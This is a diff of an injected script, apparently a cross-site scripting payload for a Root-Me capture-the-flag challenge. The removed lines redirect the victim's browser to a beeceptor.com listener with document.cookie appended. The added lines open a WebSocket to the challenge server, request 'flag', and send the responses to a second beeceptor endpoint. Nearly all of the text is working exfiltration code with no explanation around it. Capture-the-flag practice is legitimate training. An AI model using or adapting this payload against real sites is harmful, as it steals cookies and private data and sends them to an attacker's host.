@@ -1,15 +1,22 @@
 <script>
-var url = "http://ctf15.root-me.org/";
-var req = new XMLHttpRequest();
+document.addEventListener("DOMContentLoaded", function () {
 
-req.onload = function () {
-    if (req.status === 200) {
-        //var data = encodeURIComponent(req.response.documentElement.innerHTML);
-        window.location = "https://toitoise.free.beeceptor.com/?s=in&c=" + document.cookie;
-    }
-};
+    var ws = new WebSocket("ws://ctf15.root-me.org/ws");
 
-req.open("GET", url, true);
-req.responseType = "document";
-req.send();
+    ws.onopen = function () {
+        ws.send("flag");
+    };
+
+    ws.onmessage = function (event) {
+        fetch(
+            "https://toitoise2.free.beeceptor.com/?flag=" +
+            encodeURIComponent(event.data)
+        );
+    };
+
+    ws.onerror = function () {
+        fetch("https://toitoise2.free.beeceptor.com/?err=ws_error");
+    };
+
+});
 </script>
